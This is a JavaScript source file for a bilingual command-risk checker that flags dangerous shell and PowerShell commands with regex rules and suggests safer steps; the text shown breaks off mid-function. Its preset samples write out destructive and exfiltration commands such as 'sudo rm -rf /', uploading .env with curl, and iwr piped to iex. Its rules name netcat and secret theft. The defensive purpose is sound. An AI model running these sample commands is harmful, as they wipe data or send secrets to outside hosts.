(() => {
  "use strict";

  const $ = (id) => document.getElementById(id);
  const osSelect = $("osSelect");
  const cmdInput = $("cmdInput");
  const analyzeBtn = $("analyzeBtn");
  const clearBtn = $("clearBtn");
  const copyBtn = $("copyBtn");
  const resultSection = $("resultSection");
  const riskLevelEl = $("riskLevel");
  const findingsEl = $("findings");
  const saferStepsEl = $("saferSteps");
  const normalizedCmdEl = $("normalizedCmd");
  const normalizedWrap = $("normalizedWrap");
  const langButtons = document.querySelectorAll(".nw-lang-switch button");
  const i18nNodes = document.querySelectorAll("[data-i18n]");
  let currentLang = (navigator.language || "").toLowerCase().startsWith("ja") ? "ja" : "en";
  const t = (ja, en) => currentLang === "ja" ? ja : en;
  const pick = (obj) => currentLang === "ja" ? obj.ja : obj.en;

  injectUiPolish();
  applyLang(currentLang);

  function injectUiPolish() {
    const style = document.createElement("style");
    style.textContent = `
      .toast{position:fixed;left:50%;bottom:18px;transform:translateX(-50%);z-index:50;max-width:calc(100% - 24px);padding:10px 14px;border-radius:999px;background:#111827;color:#fff;font-size:13px;box-shadow:0 8px 24px rgba(0,0,0,.18)}
      .free-capabilities{border:1px solid #e5e7eb;background:#f9fafb;border-radius:12px;padding:10px;margin:10px 0 0}.free-capabilities p{margin:0 0 6px;color:#374151;font-size:13px}.free-capabilities ul{margin:0;padding-left:18px}.free-capabilities li{margin:5px 0;font-size:13px;line-height:1.45}.summary-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px;margin:12px 0 8px}.summary-item{border:1px solid #e5e7eb;border-radius:12px;padding:10px;background:#fff;display:flex;justify-content:space-between;align-items:baseline}.summary-item b{font-size:20px}.summary-item span,.summary-categories,.summary-note{font-size:12px;color:#6b7280}.summary-item.high{border-color:rgba(185,28,28,.25);background:rgba(185,28,28,.06)}.summary-item.medium{border-color:rgba(180,83,9,.25);background:rgba(180,83,9,.07)}.summary-item.low{border-color:rgba(4,120,87,.25);background:rgba(4,120,87,.06)}.category-pill{font-size:11px;padding:4px 8px;border-radius:999px;border:1px solid #dbeafe;background:#eff6ff;color:#1d4ed8}.finding-detail{display:grid;grid-template-columns:72px 1fr;gap:6px 8px;margin:8px 0 0;font-size:12px;line-height:1.55}.finding-detail dt{font-weight:700;color:#374151}.finding-detail dd{margin:0;color:#4b5563}.preset-buttons .btn{font-size:12px}@media(max-width:480px){.summary-grid{grid-template-columns:1fr}.finding-detail{grid-template-columns:1fr}}`;
    document.head.appendChild(style);

    let toast = $("toast");
    if (!toast) {
      toast = document.createElement("div");
      toast.id = "toast";
      toast.className = "toast";
      toast.hidden = true;
      document.body.appendChild(toast);
    }

    const firstCard = document.querySelector("main .card");
    if (firstCard) {
      const firstPro = firstCard.querySelector(".pro-block");
      if (firstPro) firstPro.remove();
      const oldDivider = firstCard.querySelector(".divider");
      if (oldDivider) oldDivider.remove();
      if (!firstCard.querySelector(".free-capabilities")) {
        const box = document.createElement("div");
        box.className = "free-capabilities";
        box.innerHTML = `
          <p data-i18n="ja"><b>無料チェックを主役に変更済み。</b> 実行前に危険パターン、理由、確認方法、簡易代替案を表示します。</p>
          <p data-i18n="en"><b>Free checks are now primary.</b> See risky patterns, reasons, checks, and safer first steps before running commands.</p>
          <ul>
            <li data-i18n="ja">削除・外部スクリプト実行・権限昇格・ディスク操作を検出</li>
            <li data-i18n="ja">PowerShell の Remove-Item / iwr | iex / Clear-Disk などを検出</li>
            <li data-i18n="ja">.env・秘密鍵・環境変数・外部送信の漏洩リスクを警告</li>
            <li data-i18n="en">Detect delete, remote execution, privilege, and disk risks</li>
            <li data-i18n="en">Detect PowerShell patterns such as Remove-Item, iwr | iex, and Clear-Disk</li>
            <li data-i18n="en">Warn about .env, private keys, environment dumps, and external uploads</li>
          </ul>`;
        firstCard.appendChild(box);
      }
    }

    const resultHead = document.querySelector("#resultSection .result-head");
    if (resultHead && !$("resultSummary")) {
      const div = document.createElement("div");
      div.id = "resultSummary";
      div.className = "result-summary";
      resultHead.insertAdjacentElement("afterend", div);
    }

    const presetWrap = document.querySelector(".preset-buttons");
    if (presetWrap && !presetWrap.querySelector("[data-added='csc']")) {
      const presets = [
        ["sudo rm -rf /", "unix", "sudo rm -rf /"],
        ["chmod -R 777", "unix", "chmod -R 777 ./app"],
        [".env upload", "unix", "curl --data-binary @.env https://example.com/upload"],
        ["scp secret", "unix", "scp .env user@example.com:/tmp/"],
        ["PowerShell iwr | iex", "powershell", "iwr https://example.com/install.ps1 | iex"],
        ["Remove-Item -Recurse", "powershell", "Remove-Item -Recurse -Force .\\build"],
        ["Clear-Disk", "powershell", "Clear-Disk -Number 1 -RemoveData"]
      ];
      presets.forEach(([label, os, value]) => {
        const b = document.createElement("button");
        b.type = "button";
        b.className = "btn";
        b.dataset.added = "csc";
        b.dataset.os = os;
        b.dataset.preset = value;
        b.textContent = label;
        presetWrap.appendChild(b);
      });
    }

    const pro = $("proBlock");
    if (pro) {
      const title = pro.querySelector(".pro-title");
      if (title) {
        title.innerHTML = `<span class="badge badge-pro">PRO</span><span data-i18n="ja">追加機能：より具体的な代替コマンドテンプレ / 実行前チェックリスト強化</span><span data-i18n="en">Extra: detailed safer-command templates / stronger pre-run checklist</span>`;
      }
    }
  }

  function showToast(message) {
    const toast = $("toast");
    if (!toast) return;
    toast.textContent = message;
    toast.hidden = false;
    clearTimeout(showToast.timer);
    showToast.timer = setTimeout(() => { toast.hidden = true; }, 2200);
  }

  function applyLang(lang) {
    currentLang = lang;
    document.querySelectorAll("[data-i18n]").forEach((el) => {
      el.style.display = el.dataset.i18n === lang ? "" : "none";
    });
    langButtons.forEach((b) => b.classList.toggle("active", b.dataset.lang === lang));
    if (window.__nw_lastResult) renderResult(window.__nw_lastResult);
  }
  langButtons.forEach((btn) => btn.addEventListener("click", () => applyLang(btn.dataset.lang)));

  const normalizeNewlines = (text) => String(text || "").replace(/\r\n/g, "\n").replace(/\r/g, "\n");
  const trimLines = (text) => normalizeNewlines(text).split("\n").map((line) => line.trim()).filter(Boolean).join("\n");
  const escapeHtml = (text) => String(text).replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#039;");

  const C = {
    destructive:{ja:"破壊・削除",en:"Destructive delete"}, remoteExec:{ja:"外部スクリプト実行",en:"Remote script execution"}, privilege:{ja:"権限昇格",en:"Privilege escalation"}, disk:{ja:"ディスク操作",en:"Disk operation"}, exfil:{ja:"漏洩・外部送信",en:"Exfiltration"}, secrets:{ja:"秘密情報露出",en:"Secret exposure"}, packages:{ja:"パッケージ導入",en:"Package installation"}, persistence:{ja:"永続化・自動起動",en:"Persistence/autostart"}, process:{ja:"プロセス停止",en:"Process control"}, git:{ja:"Git破壊",en:"Git destructive action"}, permissions:{ja:"権限変更",en:"Permission change"}
  };
  const R = (id, os, severity, category, title, why, check, alternative, re, tags) => ({ id, os, severity, category, title, why, check, alternative, re, tags });
  const ruleLibrary = [
    R("rm_rf_root","unix","HIGH",C.destructive,{ja:"rm -rf が /・~・変数パスを対象",en:"rm -rf targets /, ~, or variable path"},{ja:"再帰削除がシステム全体・ホーム直下・展開後の不明なパスに向く可能性があります。",en:"Recursive delete may target the whole system, home directory, or an unknown expanded path."},{ja:"対象を ls -la / find で確認し、変数は echo で展開結果を確認。",en:"Check the target with ls -la/find; echo variables before using them."},{ja:"まず ls -la 対象 → find 対象 -maxdepth 1 -print → 必要なら rm -ri 対象。",en:"Use ls -la target → find target -maxdepth 1 -print → rm -ri target if needed."},/\brm\b(?=[^\n]*-[A-Za-z]*r[A-Za-z]*f|[^\n]*-[A-Za-z]*f[A-Za-z]*r)[^\n]*(?:\s\/(?:\s|$)|\s~(?:\s|$)|\s\$[A-Za-z_]\w*)/i,["rm_rf","destructive"]),
    R("rm_rf_general","unix","MED",C.destructive,{ja:"rm -rf による再帰削除",en:"Recursive delete with rm -rf"},{ja:"対象パスの誤りで必要なファイルまで消す可能性があります。",en:"A wrong target path can delete needed files."},{ja:"削除前に pwd と ls -la で現在地・対象を確認。",en:"Run pwd and ls -la before deleting."},{ja:"rm -ri 対象、またはゴミ箱へ移動するコマンドを使う。",en:"Use rm -ri target or move files to trash instead."},/\brm\b(?=[^\n]*-[A-Za-z]*r[A-Za-z]*f|[^\n]*-[A-Za-z]*f[A-Za-z]*r)[^\n]+/i,["rm_rf","destructive"]),
    R("curl_pipe_shell","unix","HIGH",C.remoteExec,{ja:"curl/wget の出力をシェルへ直接実行",en:"curl/wget output piped directly to shell"},{ja:"外部スクリプトの中身を確認せず、そのまま実行します。",en:"Runs a remote script without inspecting it first."},{ja:"URLの提供元、HTTPS、スクリプト内容、チェックサムを確認。",en:"Verify source, HTTPS, script contents, and checksum."},{ja:"curl -fsSL URL -o install.sh → less install.sh → shasum -a 256 install.sh → 必要なら sh install.sh。",en:"curl -fsSL URL -o install.sh → less install.sh → shasum -a 256 install.sh → sh install.sh only if needed."},/\b(curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh)\b/i,["curl_pipe","remote_exec"]),
    R("sudo_destructive","unix","HIGH",C.privilege,{ja:"sudo 付きの破壊的コマンド",en:"Destructive command with sudo"},{ja:"高権限で削除・上書き・権限変更を行うため、失敗時の影響が大きくなります。",en:"Elevated privileges make delete/overwrite/permission mistakes more damaging."},{ja:"sudo が本当に必要か、対象パスが限定されているか確認。",en:"Check whether sudo is necessary and whether the target is scoped."},{ja:"sudo なしで確認コマンドを先に実行し、必要最小限の対象だけにする。",en:"Run non-sudo inspection first and limit the target as much as possible."},/\bsudo\b[^\n]*\b(?:rm|dd|mkfs|fdisk|diskutil|truncate|mv|cp|chmod|chown|apt(?:-get)?\s+(?:remove|purge))\b/i,["sudo","privilege"]),
    R("dd_to_device","unix","HIGH",C.disk,{ja:"dd で物理/仮想ディスクへ書き込み",en:"dd writing to a disk device"},{ja:"of= の指定ミスでディスク内容を上書きする可能性があります。",en:"A wrong of= target can overwrite disk contents."},{ja:"lsblk / diskutil list で対象デバイスを再確認。",en:"Re-check the device with lsblk or diskutil list."},{ja:"小さいテストファイルに出力して動作確認してから、必要時のみ実行。",en:"Test by writing to a small file first; use the device only if necessary."},/\bdd\b[^\n]*\bof=\/dev\/(?:sd[a-z]|hd[a-z]|nvme\d+n\d+|disk\d+)\b/i,["disk_write","disk"]),
    R("disk_format_unix","unix","HIGH",C.disk,{ja:"ディスク初期化・パーティション操作",en:"Disk formatting or partitioning"},{ja:"ファイルシステム作成やパーティション変更はデータ消失につながります。",en:"Formatting or partitioning can cause data loss."},{ja:"対象デバイス名、バックアップ、マウント状態を確認。",en:"Confirm device name, backups, and mount state."},{ja:"まず lsblk / diskutil list / df -h で確認だけ行う。",en:"First inspect with lsblk / diskutil list / df -h only."},/\b(?:mkfs(?:\.\w+)?|fdisk|parted|diskutil\s+eraseDisk)\b/i,["disk_format","disk"]),
    R("git_reset_hard","all","MED",C.git,{ja:"git reset --hard",en:"git reset --hard"},{ja:"未コミットの変更が失われる可能性があります。",en:"Can discard uncommitted changes."},{ja:"git status と git diff を確認し、必要なら退避ブランチを作る。",en:"Check git status/diff and create a backup branch if needed."},{ja:"git stash push -u -m backup-before-reset または git branch backup。",en:"Use git stash push -u -m backup-before-reset or create a backup branch."},/\bgit\b\s+reset\b[^\n]*--hard\b/i,["git_reset","git"]),
    R("git_clean_fd","all","MED",C.git,{ja:"git clean -fd",en:"git clean -fd"},{ja:"追跡外ファイルを削除します。未追加ファイルも消える可能性があります。",en:"Deletes untracked files, including files you have not added yet."},{ja:"git clean -nd で削除予定を先に見る。",en:"Run git clean -nd first to preview deletions."},{ja:"git clean -nd → 問題なければ対象を限定して実行。",en:"Preview with git clean -nd, then run with a narrower target."},/\bgit\b\s+clean\b[^\n]*-(?:[A-Za-z]*f[A-Za-z]*d|[A-Za-z]*d[A-Za-z]*f)\b/i,["git_clean","git"]),
    R("chmod_r_broad","unix","MED",C.permissions,{ja:"chmod -R の広範囲な権限変更",en:"Broad recursive chmod"},{ja:"再帰的な権限変更は範囲が広く、777/666は特に危険です。",en:"Recursive permission changes are broad; 777/666 are especially risky."},{ja:"対象ディレクトリと変更後権限を確認。find で対象を絞る。",en:"Confirm target directory and resulting permissions; narrow scope with find."},{ja:"find 対象 -type f -print などで対象確認後、必要な権限だけ付与。",en:"Preview targets with find, then grant only the needed permissions."},/\bchmod\b[^\n]*-R[^\n]*(?:777|775|666|\+[rwx]{1,3})\b/i,["chmod","permissions"]),
    R("chown_recursive","unix","MED",C.permissions,{ja:"chown -R",en:"chown -R"},{ja:"所有者を再帰的に変えると、アプリやOSの権限が壊れる可能性があります。",en:"Recursive ownership changes can break app or OS permissions."},{ja:"pwd と対象パスを確認し、必要なサブディレクトリだけに限定。",en:"Check pwd and target path; limit to the needed subdirectory."},{ja:"まず ls -la 対象 で所有者を確認し、限定パスにだけ chown。",en:"Check ownership with ls -la target, then chown only a limited path."},/\bchown\b[^\n]*-R\b/i,["chown_recursive","permissions"]),
    R("curl_upload_file","unix","HIGH",C.exfil,{ja:"curl でファイル内容を外部送信",en:"curl uploads file contents"},{ja:"@file 指定でローカルファイルの内容が外部URLへ送信される可能性があります。",en:"@file can send local file contents to a remote URL."},{ja:"送信先URL、送信ファイル、機密情報の有無を確認。",en:"Check destination URL, file path, and whether it contains secrets."},{ja:"必要最小限のダミーデータで試し、機密ファイルは送らない。",en:"Test with minimal dummy data and do not send sensitive files."},/\bcurl\b[^\n]*(?:-d|--data|--data-raw|--data-binary|--form|-F)\s+@[^\s]+/i,["exfiltration","curl_upload"]),
    R("scp_remote_copy","unix","MED",C.exfil,{ja:"scp による外部コピー",en:"External copy via scp"},{ja:"指定ファイルがリモートホストへコピーされます。秘密情報を含む可能性があります。",en:"Copies files to a remote host; they may contain secrets."},{ja:"コピー元ファイル、コピー先ホスト、宛先パスを確認。",en:"Check source file, remote host, and destination path."},{ja:"まず ls -lh 対象 と ssh 接続先確認だけを行う。",en:"First inspect the file with ls -lh and verify the SSH destination."},/\bscp\b[^\n]+(?:[A-Za-z0-9_.-]+@[A-Za-z0-9_.-]+:|[A-Za-z0-9_.-]+:\/)/i,["exfiltration","scp"]),
    R("rsync_remote_copy","unix","MED",C.exfil,{ja:"rsync による外部同期",en:"External sync via rsync"},{ja:"大量のファイルや秘密情報をリモートへ同期する可能性があります。",en:"May sync many files or secrets to a remote host."},{ja:"--dry-run と --itemize-changes で送信対象を確認。",en:"Use --dry-run and --itemize-changes to preview what will be sent."},{ja:"rsync --dry-run --itemize-changes ... を先に実行。",en:"Run rsync --dry-run --itemize-changes ... first."},/\brsync\b[^\n]+(?:[A-Za-z0-9_.-]+@[A-Za-z0-9_.-]+:|[A-Za-z0-9_.-]+:\/)/i,["exfiltration","rsync"]),
    R("nc_file_send","unix","HIGH",C.exfil,{ja:"nc/netcat でファイル送信",en:"File sent via nc/netcat"},{ja:"リダイレクトでファイル内容を任意ホストへ送信する可能性があります。",en:"Redirect can send file contents to an arbitrary host."},{ja:"送信先ホスト、ポート、送信ファイルを確認。",en:"Check host, port, and file being sent."},{ja:"実行しない。必要なら安全な転送手段と送信内容の確認を使う。",en:"Do not run; use a safer transfer method after inspecting content."},/\b(?:nc|netcat)\b[^\n]*\s+[A-Za-z0-9_.-]+\s+\d+[^\n]*<\s*[^\s]+/i,["exfiltration","nc"]),
    R("secret_file_print","unix","HIGH",C.secrets,{ja:"秘密鍵・設定ファイルの表示",en:"Secret key/config file printed"},{ja:"秘密鍵や .env を表示すると、画面共有・ログ・コピーで漏れる可能性があります。",en:"Printing keys or .env can leak through screen sharing, logs, or copy/paste."},{ja:"表示先が安全か、内容を共有しないか確認。",en:"Check whether the display/log destination is safe."},{ja:"値は表示せず、存在確認は test -f や ls -l で行う。",en:"Do not print values; use test -f or ls -l to confirm existence."},/\bcat\b[^\n]*(?:~\/\.ssh\/(?:id_rsa|id_ed25519)|\.env|\.npmrc|\.pypirc|\.aws\/credentials)/i,["secrets","secret_print"]),
    R("grep_recursive_secret","unix","MED",C.secrets,{ja:"秘密情報キーワードの再帰検索",en:"Recursive secret keyword search"},{ja:"token/secret/key/password を含む行が端末やログに表示される可能性があります。",en:"Lines containing token/secret/key/password may be printed to terminal or logs."},{ja:"出力を共有しない。必要ならファイル名だけに限定。",en:"Do not share output; limit to filenames if possible."},{ja:"grep -RIl 'token' . のようにファイル名だけ表示。",en:"Use grep -RIl 'token' . to show filenames only."},/\bgrep\b[^\n]*(?:token|secret|api[_-]?key|password)[^\n]*(?:-R|-r)|\bgrep\b[^\n]*(?:-R|-r)[^\n]*(?:token|secret|api[_-]?key|password)/i,["secrets","grep_secret"]),
    R("env_dump","all","MED",C.secrets,{ja:"環境変数の一括表示",en:"Environment variables dumped"},{ja:"APIキーやトークンが環境変数に含まれている場合、そのまま表示されます。",en:"API keys or tokens in environment variables may be printed."},{ja:"出力を共有しない。必要な変数名だけを確認。",en:"Do not share output; inspect only the variable names you need."},{ja:"printenv NAME のように個別確認。秘密値は伏せる。",en:"Use printenv NAME for specific variables and redact secrets."},/(?:^|[;&|]\s*)(?:printenv|env)(?:\s*$|\s*[;&|])/i,["secrets","env_dump"]),
    R("url_contains_secret_param","all","HIGH",C.secrets,{ja:"URL内に token/key/secret らしき値",en:"URL contains token/key/secret parameter"},{ja:"URLは履歴・ログ・リファラに残りやすく、秘密情報の置き場として危険です。",en:"URLs often end up in history, logs, or referrers; they are unsafe for secrets."},{ja:"URL内の秘密値を削除・再発行できるか確認。",en:"Remove the secret from the URL and rotate it if needed."},{ja:"Authorizationヘッダーや安全な設定ファイルを使い、共有時は必ず伏字化。",en:"Use Authorization headers or safe config files; redact before sharing."},/https?:\/\/[^\s"'`]+(?:token|api[_-]?key|key|secret|password)=/i,["secrets","url_secret"]),
    R("npm_install_global","unix","LOW",C.packages,{ja:"npm install -g",en:"npm install -g"},{ja:"グローバル導入は環境全体に影響し、PATH上のコマンドを追加します。",en:"Global installs affect the environment and add commands to PATH."},{ja:"パッケージ名、メンテナ、公式手順を確認。",en:"Check package name, maintainer, and official docs."},{ja:"npx / npm exec / プロジェクトローカル devDependency を検討。",en:"Consider npx, npm exec, or project-local devDependency."},/\bnpm\b[^\n]*\binstall\b[^\n]*(?:\s-g\b|\s--global\b)/i,["package_install"]),
    R("sudo_pip_install","unix","MED",C.packages,{ja:"sudo pip install",en:"sudo pip install"},{ja:"Pythonパッケージを管理者権限で入れると、システムPythonや権限を壊す可能性があります。",en:"Installing Python packages with sudo can break system Python or permissions."},{ja:"venv/仮想環境で足りるか確認。",en:"Check if a venv/virtual environment is sufficient."},{ja:"python -m venv .venv → source .venv/bin/activate → pip install ...。",en:"python -m venv .venv → source .venv/bin/activate → pip install ..."},/\bsudo\b[^\n]*\bpip\d?\b\s+install\b/i,["package_install","sudo"]),
    R("apt_remove_purge","unix","MED",C.packages,{ja:"apt remove / purge",en:"apt remove / purge"},{ja:"依存関係ごと重要なパッケージを削除する可能性があります。",en:"May remove important packages and dependencies."},{ja:"削除予定リストを読み、必要パッケージが含まれていないか確認。",en:"Read the planned removal list and check for required packages."},{ja:"apt -s remove パッケージ でシミュレーション。",en:"Use apt -s remove package to simulate first."},/\b(?:apt|apt-get)\b\s+(?:remove|purge|autoremove)\b/i,["package_remove"]),
    R("systemctl_enable","unix","MED",C.persistence,{ja:"systemctl enable",en:"systemctl enable"},{ja:"サービスを自動起動化し、次回起動後も動き続ける可能性があります。",en:"Enables a service to start automatically and persist across reboots."},{ja:"サービス名、ユニットファイル、実行ユーザーを確認。",en:"Check service name, unit file, and run user."},{ja:"まず systemctl status / cat unit で内容確認。",en:"First inspect with systemctl status and cat the unit file."},/\bsystemctl\b\s+enable\b/i,["persistence"]),
    R("crontab_change","unix","MED",C.persistence,{ja:"crontab の変更",en:"crontab modification"},{ja:"定期実行を追加・削除し、意図しない処理が継続する可能性があります。",en:"Can add/remove scheduled jobs that keep running later."},{ja:"現在の crontab -l と追加内容を確認。",en:"Check current crontab -l and the new entry."},{ja:"crontab -l > backup.cron でバックアップしてから編集。",en:"Back up with crontab -l > backup.cron before editing."},/\bcrontab\b\s+(?:-e|-r|[^\s]+)|\|\s*crontab\b/i,["persistence","cron"]),
    R("launchctl_persistence","unix","MED",C.persistence,{ja:"launchctl による自動起動変更",en:"Autostart change via launchctl"},{ja:"macOSの自動起動・常駐設定を変更する可能性があります。",en:"May change macOS autostart or background service settings."},{ja:"plist の内容と Label / ProgramArguments を確認。",en:"Inspect the plist Label and ProgramArguments."},{ja:"launchctl print で状態確認だけを先に行う。",en:"Use launchctl print first for inspection only."},/\blaunchctl\b[^\n]*(?:load|bootstrap|enable|kickstart)\b/i,["persistence","launchctl"]),
    R("ps_remove_recurse_force","powershell","HIGH",C.destructive,{ja:"Remove-Item -Recurse -Force",en:"Remove-Item -Recurse -Force"},{ja:"確認なしで再帰削除する典型的な危険コマンドです。",en:"A typical dangerous recursive delete without confirmation."},{ja:"対象パスを Get-ChildItem で確認し、-WhatIf を先に使う。",en:"Inspect target with Get-ChildItem and use -WhatIf first."},{ja:"Get-ChildItem 対象 → Remove-Item 対象 -Recurse -WhatIf → 必要なら -Confirm。",en:"Get-ChildItem target → Remove-Item target -Recurse -WhatIf → use -Confirm if needed."},/\bRemove-Item\b[^\n]*(?:-Recurse|-r)\b[^\n]*(?:-Force|-f)\b/i,["ps_delete","destructive"]),
    R("ps_iwr_iex","powershell","HIGH",C.remoteExec,{ja:"Invoke-WebRequest / iwr を iex へパイプ",en:"Invoke-WebRequest / iwr piped to iex"},{ja:"外部から取得したPowerShellコードを中身確認なしで実行します。",en:"Executes remote PowerShell code without inspection."},{ja:"URL提供元、取得内容、署名、ハッシュを確認。",en:"Verify source URL, content, signature, and hash."},{ja:"Invoke-WebRequest URL -OutFile script.ps1 → notepad script.ps1 → Get-FileHash script.ps1。",en:"Invoke-WebRequest URL -OutFile script.ps1 → inspect → Get-FileHash script.ps1."},/\b(?:Invoke-WebRequest|iwr|curl)\b[^\n|]*\|\s*(?:Invoke-Expression|iex)\b/i,["ps_remote_exec","remote_exec"]),
    R("ps_execution_policy_bypass","powershell","MED",C.privilege,{ja:"ExecutionPolicy Bypass / Unrestricted",en:"ExecutionPolicy Bypass / Unrestricted"},{ja:"PowerShellの実行制限を緩め、未確認スクリプト実行につながります。",en:"Loosens PowerShell execution restrictions and may allow untrusted scripts."},{ja:"対象スクリプトの入手元と署名を確認。",en:"Check script source and signature."},{ja:"一時的な Process スコープに限定し、実行後に戻す。",en:"Limit to Process scope temporarily and revert after use."},/\bSet-ExecutionPolicy\b[^\n]*\b(?:Bypass|Unrestricted)\b/i,["ps_policy","privilege"]),
    R("ps_runas","powershell","MED",C.privilege,{ja:"Start-Process -Verb runAs",en:"Start-Process -Verb runAs"},{ja:"管理者権限でプロセスを起動します。実行内容の影響が大きくなります。",en:"Starts a process as administrator, increasing impact."},{ja:"起動するプログラム、引数、作業ディレクトリを確認。",en:"Check program, arguments, and working directory."},{ja:"管理者権限なしで確認コマンドを先に実行。",en:"Run inspection commands without administrator rights first."},/\bStart-Process\b[^\n]*-Verb\s+runAs\b/i,["ps_runas","privilege"]),
    R("ps_disk_ops","powershell","HIGH",C.disk,{ja:"Format-Volume / Clear-Disk / Remove-Partition",en:"Format-Volume / Clear-Disk / Remove-Partition"},{ja:"ディスク・ボリューム・パーティションを削除/初期化する可能性があります。",en:"Can erase or format disks, volumes, or partitions."},{ja:"Get-Disk / Get-Volume / Get-Partition で対象を確認。",en:"Inspect targets with Get-Disk / Get-Volume / Get-Partition."},{ja:"まず Get-* コマンドだけで対象確認。変更系は実行しない。",en:"First use Get-* inspection commands only; do not run mutation commands."},/\b(?:Format-Volume|Clear-Disk|Remove-Partition)\b/i,["ps_disk","disk"]),
    R("ps_stop_process","powershell","MED",C.process,{ja:"Stop-Process",en:"Stop-Process"},{ja:"重要プロセスを停止し、作業中データやサービスに影響する可能性があります。",en:"May stop important processes and affect work or services."},{ja:"Get-Process で対象名/IDを確認。",en:"Verify target name/ID with Get-Process."},{ja:"Get-Process -Name 対象 で確認後、必要なら個別IDに限定。",en:"Inspect with Get-Process -Name target, then limit to a specific ID if needed."},/\bStop-Process\b[^\n]*(?:-Name|-Id)\b/i,["ps_stop","process"])
  ];

  const safePatterns = [/\bls\b/i,/\bpwd\b/i,/\bwhoami\b/i,/\bgit\b\s+status\b/i,/\bgit\b\s+diff\b/i,/\bGet-ChildItem\b/i,/\bGet-Process\b/i,/\bGet-Command\b/i];
  const rank = (s) => s === "HIGH" ? 3 : s === "MED" ? 2 : s === "LOW" ? 1 : 0;
  const applies = (rule, os) => rule.os === "all" || rule.os === os;

  function analyzeCommand(input) {
    const normalized = trimLines(input);
    const lines = normalized ? normalized.split("\n") : [];
    const os = osSelect?.value || "unix";
    const findings = [];
    const tags = new Set();
    const cat = new Map();
    lines.forEach((line, i) => {
      ruleLibrary.forEach((rule) => {
        if (!applies(rule, os)) return;
        rule.re.lastIndex = 0;
        if (rule.re.test(line)) {
          findings.push({ line: i + 1, command: line, rule });
          rule.tags.forEach((x) => tags.add(x));
          cat.set(rule.category.en, rule.category);
        }
      });
    });
    findings.sort((a, b) => rank(b.rule.severity) - rank(a.rule.severity) || a.line - b.line);
    const counts = { HIGH: 0, MED: 0, LOW: 0 };
    findings.forEach((x) => { counts[x.rule.severity] += 1; });
    const risk = findings.reduce((acc, x) => rank(x.rule.severity) > rank(acc) ? x.rule.severity : acc, "LOW");
    const hasSafeOnly = findings.length === 0 && lines.length > 0 && lines.every((line) => safePatterns.some((re) => re.test(line)));
    return { os, normalized, findings, counts, categories: Array.from(cat.values()), tags: Array.from(tags), risk: findings.length ? risk : (hasSafeOnly ? "LOW" : "LOW") };
  }

  function buildSaferSteps(result) {
    const tags = new Set(result.tags || []);
    const steps = [
      t("コマンドを一語ずつ読み直し、意味が曖昧なら実行しない。", "Read the command carefully; if anything is unclear, do not run it."),
      t("対象パス・URL・ホスト名・権限を確認してから実行する。", "Check target paths, URLs, hostnames, and privileges before running."),
      t("バックアップ、git commit、または復元できる状態を先に作る。", "Create a backup, git commit, or other recovery point first.")
    ];
    if (tags.has("rm_rf") || tags.has("ps_delete")) steps.push(t("削除系は ls / find / Get-ChildItem / -WhatIf で対象を確認してから判断。", "For deletes, preview targets with ls/find/Get-ChildItem/-WhatIf first."));
    if (tags.has("curl_pipe") || tags.has("ps_remote_exec")) steps.push(t("外部スクリプトは直接実行せず、保存して中身を確認してから判断。", "Do not run remote scripts directly; save and inspect them first."));
    if (tags.has("exfiltration") || tags.has("secrets") || tags.has("env_dump")) steps.push(t("秘密鍵・.env・環境変数・送信先URLを確認し、共有前に必ず伏字化。", "Check keys, .env, environment variables, and destinations; redact before sharing."));
    if (tags.has("disk") || tags.has("disk_write") || tags.has("ps_disk")) steps.push(t("ディスク操作は対象デバイス名を確認し、バックアップがないなら実行しない。", "For disk operations, verify device names and do not run without backups."));
    if (tags.has("git_reset") || tags.has("git_clean")) steps.push(t("Git破壊系は git status / git diff / git clean -nd で影響を先に確認。", "For destructive Git commands, preview impact with git status/diff/clean -nd."));
    if (tags.has("persistence") || tags.has("cron") || tags.has("launchctl")) steps.push(t("自動起動・定期実行は、登録前に現在設定と追加内容を控える。", "For autostart/scheduled jobs, record current and new settings first."));
    if (tags.has("sudo") || tags.has("privilege") || tags.has("ps_runas")) steps.push(t("管理者権限が本当に必要か確認し、まず読み取り専用コマンドで確認。", "Confirm admin privileges are truly needed; start with read-only commands."));
    return steps;
  }

  function renderSummary(result) {
    const el = $("resultSummary");
    if (!el) return;
    const cats = result.categories.length ? result.categories.map((c) => pick(c)).join(" / ") : t("なし", "None");
    el.innerHTML = `<div class="summary-grid"><div class="summary-item high"><b>${result.counts.HIGH}</b><span>High</span></div><div class="summary-item medium"><b>${result.counts.MED}</b><span>Medium</span></div><div class="summary-item low"><b>${result.counts.LOW}</b><span>Low</span></div></div><p class="summary-categories"><b>${escapeHtml(t("検出カテゴリ", "Categories"))}:</b> ${escapeHtml(cats)}</p>${result.findings.length ? "" : `<p class="summary-note">${escapeHtml(t("危険パターン未検出。ただし安全保証ではありません。", "No risky pattern detected. This is not a safety guarantee."))}</p>`}`;
  }

  function renderResult(result) {
    window.__nw_lastResult = result;
    if (resultSection) resultSection.hidden = false;
    riskLevelEl.textContent = result.risk;
    riskLevelEl.className = `badge ${result.risk === "HIGH" ? "high" : result.risk === "MED" ? "medium" : "low"}`;
    renderSummary(result);
    findingsEl.innerHTML = "";
    if (result.findings.length === 0) {
      const li = document.createElement("li");
      li.className = "finding empty";
      li.innerHTML = `<strong>${escapeHtml(t("危険パターンは検出されませんでした", "No risky patterns detected"))}</strong><br><span class="meta">${escapeHtml(t("ただし安全を保証するものではありません。URL・パス・権限は必ず確認してください。", "This does not guarantee safety. Always check URLs, paths, and privileges."))}</span>`;
      findingsEl.appendChild(li);
    } else {
      result.findings.forEach((item) => {
        const li = document.createElement("li");
        li.className = "finding";
        li.innerHTML = `<div class="finding-head"><span class="tag ${item.rule.severity.toLowerCase()}">${item.rule.severity}</span><span class="category-pill">${escapeHtml(pick(item.rule.category))}</span><span class="finding-title">L${item.line}: ${escapeHtml(pick(item.rule.title))}</span></div><div class="code-line">${escapeHtml(item.command)}</div><dl class="finding-detail"><dt>${escapeHtml(t("理由", "Why"))}</dt><dd>${escapeHtml(pick(item.rule.why))}</dd><dt>${escapeHtml(t("確認", "Check"))}</dt><dd>${escapeHtml(pick(item.rule.check))}</dd><dt>${escapeHtml(t("代替", "Alternative"))}</dt><dd>${escapeHtml(pick(item.rule.alternative))}</dd></dl>`;
        findingsEl.appendChild(li);
      });
    }
    saferStepsEl.innerHTML = "";
